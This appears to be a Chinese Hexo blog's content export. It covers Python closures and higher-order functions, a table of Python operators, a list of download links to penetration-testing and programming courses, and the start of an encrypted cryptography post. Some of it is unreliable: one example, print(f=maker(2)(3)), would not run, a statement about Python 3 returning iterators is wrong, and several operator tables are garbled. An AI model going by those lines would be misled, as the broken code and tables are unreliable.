<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">maker</span>(<span class="params">N</span>):</span></span><br><span class="line"> </span><br><span class="line">　　<span class="function"><span class="keyword">def</span> <span class="title">action</span>(<span class="params">X</span>):</span></span><br><span class="line"> </span><br><span class="line">　　　　<span class="keyword">return</span> X**N</span><br><span class="line"> </span><br><span class="line">　　<span class="keyword">return</span> action</span><br><span class="line">------------------------------------------------------------------------------------------</span><br><span class="line">这个嵌套函数的外层返回值为内层函数的函数名，注意没有括号，这里有无括号是有很大区别的。此时调用外部函数：</span><br><span class="line"></span><br><span class="line">f=maker(<span class="number">2</span>)   //此时进入maker(<span class="number">2</span>)，且定义了一个action(X)函数，然后返回action函数名（对象）给f</span><br><span class="line">------------------------------------------------------------------------------------------</span><br><span class="line">那么如上所述，f便指向了action函数，且限制条件为N=<span class="number">2</span>，可以理解为f为N等于<span class="number">2</span>时的action函数。我们来调用它：</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(f(<span class="number">3</span>))   //此时相当于调用了cation(<span class="number">3</span>)函数，这也是在外部使用内部嵌套函数的方法，</span><br><span class="line">              //因为内部嵌套函数是不允许在外部访问的。</span><br><span class="line"></span><br><span class="line">输出：</span><br><span class="line"><span class="number">9</span>            //证明f和action函数是一样的。</span><br><span class="line">------------------------------------------------------------------------------------------</span><br><span class="line">如上的示例也可以用<span class="built_in">print</span>(f=maker(<span class="number">2</span>)(<span class="number">3</span>))来输出结果一样，两个括号连在一起相当于执行了这两个函数。</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">maker</span>(<span class="params">N</span>):</span></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">a</span>(<span class="params">c</span>):</span> </span><br><span class="line">		<span class="keyword">return</span> c**N </span><br><span class="line">	<span class="keyword">return</span> a</span><br><span class="line"></span><br><span class="line">f=maker(<span class="number">2</span>)(<span class="number">3</span>)</span><br><span class="line"><span class="built_in">print</span>(f)</span><br><span class="line"></span><br><span class="line">OUTPUT: <span class="number">9</span></span><br></pre></td></tr></table></figure>

<br>

<p><font color="red"><strong>2.</strong> <strong><code>a = f()</code></strong> <strong>型属于将f()的返回值赋值给a的过程</strong></font></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">这里的a仅仅接收f()的返回值，如果f()没有返回值，那么a即被赋值为<span class="literal">None</span>。这里值得注意的一点是，</span><br><span class="line">在a=f()的执行过程中，f()会运行一次，如：</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">x,y</span>):</span></span><br><span class="line">	z = x+y</span><br><span class="line">	<span class="built_in">print</span>(z)</span><br><span class="line">a = add(<span class="number">3</span>,<span class="number">4</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;******我是分隔符，嘿嘿嘿******&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"></span><br><span class="line">OUTPUT: </span><br><span class="line"><span class="number">7</span></span><br><span class="line">******我是分隔符，嘿嘿嘿******</span><br><span class="line"><span class="literal">None</span></span><br><span class="line">------------------------------------------------------------------------------------------</span><br><span class="line">这里在分隔符前输出了<span class="number">7</span>，说明赋值过程函数add执行了，然而a的值为<span class="literal">None</span>，且只能通过<span class="built_in">print</span>语句才可以显示。</span><br><span class="line">这是因为add()函数没有<span class="keyword">return</span>语句。</span><br></pre></td></tr></table></figure>

<br>

<br>

<h4 id="1-2-传入函数与返回函数名"><a href="#1-2-传入函数与返回函数名" class="headerlink" title="1.2 传入函数与返回函数名"></a><font color="#3CB371" face="Comic sans MS">1.2 传入函数与返回函数名</font></h4><br>

<p><font color="#00B2EE" face="Comic sans MS"><strong>一、传入函数（把函数作为参数）</strong></font></p>
<p>&amp;emsp;&amp;emsp;既然变量可以指向函数，函数的参数能接收变量，那么一个函数就可以接收另一个函数作为参数，这种函数就称之为<strong>高阶函数</strong>。</p>
<p>一个最简单的高阶函数：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">def add(x, y, f):</span><br><span class="line">    return f(x) + f(y)</span><br></pre></td></tr></table></figure>

<p>当我们调用<code>add(-5, 6, abs)</code>时，参数x，y和f分别接收-5，6和abs，根据函数定义，我们可以推导计算过程为：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">x = -<span class="number">5</span></span><br><span class="line">y = <span class="number">6</span></span><br><span class="line">f = <span class="built_in">abs</span></span><br><span class="line">f(x) + f(y) ==&gt; abs(-5) + abs(6) ==&gt; 11</span><br><span class="line"><span class="keyword">return</span> <span class="number">11</span></span><br></pre></td></tr></table></figure>


<p>用代码验证一下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">x, y, f</span>):</span></span><br><span class="line">    <span class="keyword">return</span> f(x) + f(y)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(add(-<span class="number">5</span>, <span class="number">6</span>, <span class="built_in">abs</span>))</span><br><span class="line"></span><br><span class="line">OUTPUT: <span class="number">11</span> </span><br></pre></td></tr></table></figure>

<br>

<blockquote>
<p><strong>总结：</strong>编写高阶函数，就是让函数的参数能够接收别的函数。<font color="#FF7F00"><strong>把函数作为参数传入，这样的函数称为高阶函数，函数式编程就是指这种高度抽象的编程范式</strong></font>。</p>
</blockquote>
<br>

<p><font color="#00B2EE" face="Comic sans MS"><strong>二、返回函数名（把函数名作为返回值）</strong></font></p>
<p>&amp;emsp;&amp;emsp;高阶函数除了可以接受函数作为参数外，还可以把函数名作为结果值返回。注意Python3<font color="#FF7F00"><strong>返回的是迭代器对象</strong></font>。</p>
<br>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;我们来实现一个可变参数的求和。通常情况下，求和的函数是这样定义的：&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">calc_sum</span>(<span class="params">*args</span>):</span>   <span class="string">&#x27;在函数的参数章节讲过，*传入元组，**传入字典&#x27;</span></span><br><span class="line">    ax = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> args:</span><br><span class="line">        ax = ax + n</span><br><span class="line">    <span class="keyword">return</span> ax</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;但是，如果不需要立刻求和，而是在后面的代码中，根据需要再计算怎么办？可以不返回求和的结果，</span></span><br><span class="line"><span class="string">而是返回求和的函数：&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">lazy_sum</span>(<span class="params">*args</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">sum</span>():</span></span><br><span class="line">        ax = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> n <span class="keyword">in</span> args:</span><br><span class="line">            ax = ax + n</span><br><span class="line">        <span class="keyword">return</span> ax</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">sum</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;当我们调用lazy_sum()时，返回的并不是求和结果，而是求和函数：&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">f = lazy_sum(<span class="number">1</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">9</span>)</span><br><span class="line"><span class="built_in">print</span>(f)</span><br><span class="line">OUTPUT: &lt;function lazy_sum.&lt;<span class="built_in">locals</span>&gt;.<span class="built_in">sum</span> at <span class="number">0x101c6ed90</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;调用函数f时，才真正计算求和的结果：&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">f()</span><br><span class="line">OUTPUT: <span class="number">25</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">在这个例子中，我们在函数lazy_sum中又定义了函数sum，并且，内部函数sum可以引用外部函数lazy_sum</span></span><br><span class="line"><span class="string">的参数和局部变量，当lazy_sum返回函数sum时，相关参数和变量都保存在返回的函数中，这种称为</span></span><br><span class="line"><span class="string">“闭包（Closure）”的程序结构拥有极大的威力。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">请再注意一点，当我们调用lazy_sum()时，每次调用都会返回一个新的函数，即使传入相同的参数：</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">f1 = lazy_sum(<span class="number">1</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">9</span>)</span><br><span class="line">f2 = lazy_sum(<span class="number">1</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">9</span>)</span><br><span class="line">f1==f2</span><br><span class="line">OUTPUT: <span class="literal">False</span></span><br><span class="line"><span class="string">&#x27;f1()和f2()的调用结果互不影响。&#x27;</span></span><br></pre></td></tr></table></figure>

<br>

<p><font color="#00B2EE" face="Comic sans MS"><strong>三、闭包</strong></font></p>
<p>&amp;emsp;&amp;emsp;注意到返回的函数在其定义内部引用了局部变量<code>args</code>，所以，当一个函数返回了一个函数后，其内部的局部变量还被新函数引用，所以，闭包用起来简单，实现起来可不容易。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;另一个需要注意的问题是，返回的函数并没有立刻执行，而是直到调用了f()才执行。</span></span><br><span class="line"><span class="string">	我们来看一个例子：&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">count</span>():</span></span><br><span class="line">    fs = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">4</span>):</span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">f</span>():</span></span><br><span class="line">             <span class="keyword">return</span> i*i</span><br><span class="line">        fs.append(f)</span><br><span class="line">    <span class="keyword">return</span> fs</span><br><span class="line"></span><br><span class="line">f1, f2, f3 = count()</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;在上面的例子中，每次循环，都创建了一个新的函数，然后，把创建的3个函数都返回了。</span></span><br><span class="line"><span class="string">你可能认为调用f1()，f2()和f3()结果应该是1，4，9，但实际结果是：&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>f1()</span><br><span class="line"><span class="number">9</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>f2()</span><br><span class="line"><span class="number">9</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>f3()</span><br><span class="line"><span class="number">9</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">全部都是9！原因就在于返回的函数引用了变量i，但它并非立刻执行。等到3个函数都返回时，它们所引用的变</span></span><br><span class="line"><span class="string">量i已经变成了3，因此最终结果为9。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">返回闭包时牢记一点：返回函数不要引用任何循环变量，或者后续会发生变化的变量。</span></span><br><span class="line"><span class="string">如果一定要引用循环变量怎么办？方法是再创建一个函数，用该函数的参数绑定循环变量当前的值，无论该</span></span><br><span class="line"><span class="string">循环变量后续如何更改，已绑定到函数参数的值不变：</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">count</span>():</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">f</span>(<span class="params">j</span>):</span></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">g</span>():</span></span><br><span class="line">            <span class="keyword">return</span> j*j</span><br><span class="line">        <span class="keyword">return</span> g</span><br><span class="line">    fs = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">4</span>):</span><br><span class="line">        fs.append(f(i)) <span class="comment"># f(i)立刻被执行，因此i的当前值被传入f()</span></span><br><span class="line">    <span class="keyword">return</span> fs</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;再看看结果：&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>f1, f2, f3 = count()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>f1()</span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>f2()</span><br><span class="line"><span class="number">4</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>f3()</span><br><span class="line"><span class="number">9</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;缺点是代码较长，可利用lambda函数缩短代码。&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<br>

<br>

<h3 id="二-装饰器"><a href="#二-装饰器" class="headerlink" title="二. 装饰器"></a><font color="#FF6347" face="Comic sans MS">二. 装饰器</font></h3>]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python语言</tag>
      </tags>
  </entry>
  <entry>
    <title>Python-运算符</title>
    <url>/post/Python-Operators/</url>
    <content><![CDATA[<p>要常来骚扰…₍ ..̮ ₎ ₍ ..̮ ₎ </p>
<span id="more"></span>

<br>

<br>

<center><font color="#00B2EE" face="Comic sans MS" size=5>运算符</font> </center>

<br>

<br>

<p>Python语言支持以下类型的运算符:</p>
<ul>
<li><p><font color="#00B2EE"><a href="http://www.runoob.com/python3/python3-basic-operators.html#ysf1">算术运算符</a></font></p>
</li>
<li><p><font color="#00B2EE"><a href="http://www.runoob.com/python3/python3-basic-operators.html#ysf2">比较（关系）运算符</a></font></p>
</li>
<li><p><font color="#00B2EE"><a href="http://www.runoob.com/python3/python3-basic-operators.html#ysf3">赋值运算符</a></font></p>
</li>
<li><p><font color="#00B2EE"><a href="http://www.runoob.com/python3/python3-basic-operators.html#ysf4">逻辑运算符</a></font></p>
</li>
<li><p><font color="#00B2EE"><a href="http://www.runoob.com/python3/python3-basic-operators.html#ysf5">位运算符</a></font></p>
</li>
<li><p><font color="#00B2EE"><a href="http://www.runoob.com/python3/python3-basic-operators.html#ysf6">成员运算符</a></font></p>
</li>
<li><p><font color="#00B2EE"><a href="http://www.runoob.com/python3/python3-basic-operators.html#ysf7">身份运算符</a></font></p>
</li>
<li><p><font color="#00B2EE"><a href="http://www.runoob.com/python3/python3-basic-operators.html#ysf8">运算符优先级</a></font></p>
</li>
</ul>
<br>

<br>

<h3 id="一-算术运算符"><a href="#一-算术运算符" class="headerlink" title=" 一. 算术运算符"></a><font color="#FF6347" face="Comic sans MS"> 一. 算术运算符</font></h3><table>
<thead>
<tr>
<th align="left">运算符</th>
<th align="left">描述</th>
<th align="left">实例</th>
</tr>
</thead>
</table>
<ul>
<li>|加 - 两个对象相加                                |a + b 输出结果 30</li>
</ul>
<ul>
<li>|减 - 得到负数或是一个数减去另一个数                |a - b 输出结果 -10</li>
</ul>
<ul>
<li>|乘 - 两个数相乘或是返回一个被重复若干次的字符串    |a * b 输出结果 200<br>&#x2F;    |除 - x除以y                                        |b &#x2F; a 输出结果 2<br>%    |取模 - 返回除法的余数                            |b % a 输出结果 0</li>
</ul>
<p>**    |幂 - 返回x的y次幂                                |a**b 为10的20次方，<br>输出结果 100000000000000000000<br>&#x2F;&#x2F;    |取整除 - 返回商的整数部分（向下取整）    |&gt;&gt;&gt;&gt; 9&#x2F;&#x2F;2<br>4<br>&gt;&gt;&gt; -9&#x2F;&#x2F;2<br>-5</p>
<br>

<br>

<h3 id="二-比较运算符"><a href="#二-比较运算符" class="headerlink" title=" 二. 比较运算符"></a><font color="#FF6347" face="Comic sans MS"> 二. 比较运算符</font></h3><p>以下假设变量a为10，变量b为20：</p>
<table>
<thead>
<tr>
<th align="left">运算符</th>
<th align="left">描述</th>
<th align="left">实例</th>
</tr>
</thead>
<tbody><tr>
<td align="left">&#x3D;&#x3D;</td>
<td align="left">等于 - 比较对象是否相等</td>
<td align="left">(a &#x3D;&#x3D; b) 返回 False。</td>
</tr>
<tr>
<td align="left">!&#x3D;</td>
<td align="left">不等于 - 比较两个对象是否不相等</td>
<td align="left">(a !&#x3D; b) 返回 True。</td>
</tr>
<tr>
<td align="left">&gt;</td>
<td align="left">大于 - 返回x是否大于y</td>
<td align="left">(a &gt; b) 返回 False。</td>
</tr>
<tr>
<td align="left">&lt;</td>
<td align="left">小于 - 返回x是否小于y。所有比较运算符返回1表示真，返回0表示假。<br>这分别与特殊的变量True和False等价。注意，这些变量名的大写。</td>
<td align="left">(a &lt; b) 返回 True。</td>
</tr>
<tr>
<td align="left">&gt;&#x3D;</td>
<td align="left">大于等于 - 返回x是否大于等于y。</td>
<td align="left">(a &gt;&#x3D; b) 返回 False。</td>
</tr>
<tr>
<td align="left">&lt;&#x3D;</td>
<td align="left">小于等于 - 返回x是否小于等于y。</td>
<td align="left">(a &lt;&#x3D; b) 返回 True。</td>
</tr>
</tbody></table>
<br>

<br>

<h3 id="三-赋值运算符"><a href="#三-赋值运算符" class="headerlink" title="三. 赋值运算符"></a><font color="#FF6347" face="Comic sans MS">三. 赋值运算符</font></h3><p>以下假设变量a为10，变量b为20：</p>
<table>
<thead>
<tr>
<th align="left">运算符</th>
<th align="left">描述</th>
<th align="left">实例</th>
</tr>
</thead>
<tbody><tr>
<td align="left">&#x3D;</td>
<td align="left">简单的赋值运算符</td>
<td align="left">c &#x3D; a + b 将 a + b 的运算结果赋值为 c</td>
</tr>
<tr>
<td align="left">+&#x3D;</td>
<td align="left">加法赋值运算符</td>
<td align="left">c +&#x3D; a 等效于 c &#x3D; c + a</td>
</tr>
<tr>
<td align="left">-&#x3D;</td>
<td align="left">减法赋值运算符</td>
<td align="left">c -&#x3D; a 等效于 c &#x3D; c - a</td>
</tr>
<tr>
<td align="left">*&#x3D;</td>
<td align="left">乘法赋值运算符</td>
<td align="left">c *&#x3D; a 等效于 c &#x3D; c * a</td>
</tr>
<tr>
<td align="left">&#x2F;&#x3D;</td>
<td align="left">除法赋值运算符</td>
<td align="left">c &#x2F;&#x3D; a 等效于 c &#x3D; c &#x2F; a</td>
</tr>
<tr>
<td align="left">%&#x3D;</td>
<td align="left">取模赋值运算符</td>
<td align="left">c %&#x3D; a 等效于 c &#x3D; c % a</td>
</tr>
<tr>
<td align="left">**&#x3D;</td>
<td align="left">幂赋值运算符</td>
<td align="left">c **&#x3D; a 等效于 c &#x3D; c ** a</td>
</tr>
<tr>
<td align="left">&#x2F;&#x2F;&#x3D;</td>
<td align="left">取整除赋值运算符</td>
<td align="left">c &#x2F;&#x2F;&#x3D; a 等效于 c &#x3D; c &#x2F;&#x2F; a</td>
</tr>
</tbody></table>
<br>

<br>

<h3 id="四-位运算符"><a href="#四-位运算符" class="headerlink" title="四. 位运算符"></a><font color="#FF6347" face="Comic sans MS">四. 位运算符</font></h3><p>按位运算符是把数字看作二进制来进行计算的。Python中的按位运算法则如下：</p>
<p>下表中变量 a 为 60，b 为 13二进制格式如下：</p>
<table>
<thead>
<tr>
<th align="left"></th>
</tr>
</thead>
<tbody><tr>
<td align="left">a &#x3D; 0011 1100</td>
</tr>
<tr>
<td align="left">b &#x3D; 0000 1101</td>
</tr>
<tr>
<td align="left">a&amp;b &#x3D; 0000 1100</td>
</tr>
<tr>
<td align="left">a丨b &#x3D; 0011 1101</td>
</tr>
<tr>
<td align="left">a^b &#x3D; 0011 0001</td>
</tr>
<tr>
<td align="left"><code>~a</code>  &#x3D; 1100 0011</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th align="left">运算符</th>
<th align="left">描述</th>
<th align="left">实例</th>
</tr>
</thead>
<tbody><tr>
<td align="left">&amp;</td>
<td align="left">按位与运算符：<br>参与运算的两个值,如果两个相应位都为1,<br>则该位的结果为1,否则为0</td>
<td align="left">(a &amp; b) 输出结果 12 <br>二进制解释： 0000 1100</td>
</tr>
<tr>
<td align="left">丨</td>
<td align="left">按位或运算符：<br>只要对应的二个二进位有一个为1时，结果位就为1。</td>
<td align="left">(a 丨 b) 输出结果 61 <br>二进制解释： 0011 1101</td>
</tr>
<tr>
<td align="left">^</td>
<td align="left">按位异或运算符：<br>当两对应的二进位相异时，结果为1</td>
<td align="left">(a ^ b) 输出结果 49 <br>二进制解释： 0011 0001</td>
</tr>
<tr>
<td align="left">~</td>
<td align="left">按位取反运算符：<br>对数据的每个二进制位取反,<br>即把1变为0,把0变为1。~x 类似于 -x-1</td>
<td align="left">(~a ) 输出结果 -61 <br>二进制解释： 1100 0011 <br>在一个有符号二进制数的补码形式。</td>
</tr>
<tr>
<td align="left">&lt;&lt;</td>
<td align="left">左移动运算符：<br>运算数的各二进位全部左移若干位，<br>由”&lt;&lt;”右边的数指定移动的位数，高位丢弃，低位补0。</td>
<td align="left">a &lt;&lt; 2 输出结果 240 <br>二进制解释： 1111 0000</td>
</tr>
<tr>
<td align="left">&gt;&gt;</td>
<td align="left">右移动运算符：<br>把”&gt;&gt;”左边的运算数的各二进位全部右移若干位，<br>“&gt;&gt;”右边的数指定移动的位数</td>
<td align="left">a &gt;&gt; 2 输出结果 15 <br>二进制解释： 0000 1111</td>
</tr>
</tbody></table>
<br>

<br>

<h3 id="五-逻辑运算符"><a href="#五-逻辑运算符" class="headerlink" title="五. 逻辑运算符"></a><font color="#FF6347" face="Comic sans MS">五. 逻辑运算符</font></h3><p>Python语言支持逻辑运算符，以下假设变量 a 为 10, b为 20:</p>
<table>
<thead>
<tr>
<th align="left">运算符</th>
<th align="left">逻辑表达式</th>
<th align="left">描述</th>
<th align="left">实例</th>
</tr>
</thead>
<tbody><tr>
<td align="left">and</td>
<td align="left">x and y</td>
<td align="left">布尔”与” - 如果 x 为 False，<br>x and y 返回 False，否则它返回 y 的计算值。</td>
<td align="left">(a and b) 返回 20。</td>
</tr>
<tr>
<td align="left">or</td>
<td align="left">x or y</td>
<td align="left">布尔”或” - 如果 x 是 True，<br>它返回 x 的值，否则它返回 y 的计算值。</td>
<td align="left">(a or b) 返回 10。</td>
</tr>
<tr>
<td align="left">not</td>
<td align="left">not x</td>
<td align="left">布尔”非” - 如果 x 为 True，<br>返回 False 。如果 x 为 False，它返回 True。</td>
<td align="left">not(a and b) 返回 False</td>
</tr>
</tbody></table>
<br>

<br>

<h3 id="六-成员运算符"><a href="#六-成员运算符" class="headerlink" title="六. 成员运算符"></a><font color="#FF6347" face="Comic sans MS">六. 成员运算符</font></h3><p>除了以上的一些运算符之外，Python还支持成员运算符，测试实例中包含了一系列的成员，包括字符串，列表或元组。</p>
<table>
<thead>
<tr>
<th align="left">运算符</th>
<th align="left">描述</th>
<th align="left">实例</th>
</tr>
</thead>
<tbody><tr>
<td align="left">in</td>
<td align="left">如果在指定的序列中找到值返回 True，否则返回 False。</td>
<td align="left">x 在 y 序列中 , <br>如果 x 在 y 序列中返回 True。</td>
</tr>
<tr>
<td align="left">not in</td>
<td align="left">如果在指定的序列中没有找到值返回 True，否则返回 False。</td>
<td align="left">x 不在 y 序列中 , <br>如果 x 不在 y 序列中返回 True。</td>
</tr>
</tbody></table>
<br>

<br>

<h3 id="七-身份运算符"><a href="#七-身份运算符" class="headerlink" title="七. 身份运算符"></a><font color="#FF6347" face="Comic sans MS">七. 身份运算符</font></h3><p>身份运算符用于比较两个对象的存储单元。<br><strong>注：</strong><font color="#00B2EE">[<a href="http://www.runoob.com/python/python-func-id.html">id() 函数</a>]</font> 用于获取对象内存地址。</p>
<p>is 与 &#x3D;&#x3D; 区别：<font color="#FF7F00"><strong>is 用于判断两个变量引用对象是否为同一个， &#x3D;&#x3D; 用于判断引用变量的值是否相等</strong></font>。</p>
<table>
<thead>
<tr>
<th align="left">运算符</th>
<th align="left">描述</th>
<th align="left">实例</th>
</tr>
</thead>
<tbody><tr>
<td align="left">is</td>
<td align="left">is 是判断两个标识符是不是引用自一个对象</td>
<td align="left">x is y, 类似 id(x) &#x3D;&#x3D; id(y) 。<br> 如果引用的是同一个对象则返回 True，<br>否则返回 False</td>
</tr>
<tr>
<td align="left">is not</td>
<td align="left">is not 是判断两个标识符是不是引用自不同对象</td>
<td align="left">x is not y ， 类似 id(a) !&#x3D; id(b)。<br>如果引用的不是同一个对象则返回结果 True，<br>否则返回 False。</td>
</tr>
</tbody></table>
<br>

<br>

<h3 id="八-运算符优先级"><a href="#八-运算符优先级" class="headerlink" title="八. 运算符优先级"></a><font color="#FF6347" face="Comic sans MS">八. 运算符优先级</font></h3><p>以下表格列出了从最高到最低优先级的所有运算符：</p>
<table>
<thead>
<tr>
<th align="left">运算符</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">**</td>
<td align="left">指数 (最高优先级)</td>
</tr>
<tr>
<td align="left">~ + -</td>
<td align="left">按位翻转, 一元加号和减号 (最后两个的方法名为 +@ 和 -@)</td>
</tr>
</tbody></table>
<ul>
<li>&#x2F; % &#x2F;&#x2F;    |乘，除，取模和取整除</li>
</ul>
<ul>
<li><ul>
<li>|加法减法<br>&gt;&gt; |&lt;&lt;    右移，左移运算符<br>&amp;    |位 ‘AND’<br>^ 丨    |位运算符<br>&lt;&#x3D; &lt; &gt; &gt;&#x3D;    |比较运算符<br>&lt;&gt; &#x3D;&#x3D; !&#x3D;    |等于运算符<br>&#x3D; %&#x3D; &#x2F;&#x3D; &#x2F;&#x2F;&#x3D; -&#x3D; +&#x3D; *&#x3D; **&#x3D;    |赋值运算符<br>is is not    |身份运算符<br>in not in    |成员运算符<br>and or not    |逻辑运算符</li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python语言</tag>
      </tags>
  </entry>
  <entry>
    <title>资源</title>
    <url>/post/Resourses/</url>
    <content><![CDATA[<p>&amp;ensp;<br><font face="楷体" color="red" size=6>资源目录</font><font face="楷体" color="red">(点击相应资源会跳转哦)</font>😜</p>
<table>
<thead>
<tr>
<th>书籍</th>
<th align="center">提取码</th>
<th align="center">视频</th>
<th align="center">提取码</th>
</tr>
</thead>
<tbody><tr>
<td><a href="https://pan.baidu.com/s/1XM04ptOY0qaS3iVu3VQoLQ">安全牛 — Kali Linux渗透测试(转录)</a></td>
<td align="center">Numb1</td>
<td align="center"><a href="https://pan.baidu.com/s/1RHU4z4xr5sxLuqbkdwP_Lw">安全牛 — Kali Linux渗透测试(转录)</a></td>
<td align="center">Numb2</td>
</tr>
<tr>
<td><a href="https://pan.baidu.com/s/1fUNe2Q7aiQxtzEomXgLjYQ">算法设计与分析课件</a></td>
<td align="center">Numb3</td>
<td align="center"><a href="https://pan.baidu.com/s/1Fmi9FpCbcoR-NBLap8KivQ">Kali渗透培训课程-逆小战</a></td>
<td align="center">Numb4</td>
</tr>
<tr>
<td><a href="https://pan.baidu.com/s/1rERpm9Bm2zSzNhYPbUuh6Q">信息安全数学基础课件</a></td>
<td align="center">Numb5</td>
<td align="center"><a href="https://pan.baidu.com/s/1-lldqvPgcnNC3kjJmoS12A">SQLMAP注入牛人讲解</a></td>
<td align="center">Numb6</td>
</tr>
<tr>
<td><a href="https://pan.baidu.com/s/1iwev5nNX6DHjbHFwAPyeag">Java课件</a></td>
<td align="center">Numb7</td>
<td align="center"><a href="https://pan.baidu.com/s/1Ur8wapZIbNsMu-h4YosvOQ">Burpsuite视频教程</a></td>
<td align="center">Numb8</td>
</tr>
<tr>
<td><a href="https://pan.baidu.com/s/16_a1uYNgfQwaVZwvxW7Kog">Java 2 核心技术，卷I：基础知识（原书第7版）</a></td>
<td align="center">Numb9</td>
<td align="center"><a href="https://pan.baidu.com/s/1g2IF-com9z3qwpacugslhA">Burpsuite渗透软件教程</a></td>
<td align="center">Numb10</td>
</tr>
<tr>
<td><a href="https://pan.baidu.com/s/1DeyFfBjjzFVE4Z8B5-GsHA">Dreaming in Code</a></td>
<td align="center">Numb11</td>
<td align="center"><a href="https://pan.baidu.com/s/1txPt1Dz3q0rdaTBRvGf9eQ">Web基础</a></td>
<td align="center">Numb12</td>
</tr>
<tr>
<td><a href="https://pan.baidu.com/s/1HOw_KSFvVhKIW7UW8hZ9eA">梦断代码</a></td>
<td align="center">Numb13</td>
<td align="center"><a href="https://pan.baidu.com/s/16kHmbDuNz6tyJxKFpVqNOg">Web漏洞讲解</a></td>
<td align="center">Numb14</td>
</tr>
</tbody></table>
]]></content>
  </entry>
  <entry>
    <title>对称密码-序列密码</title>
    <url>/post/Sequence-Password/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
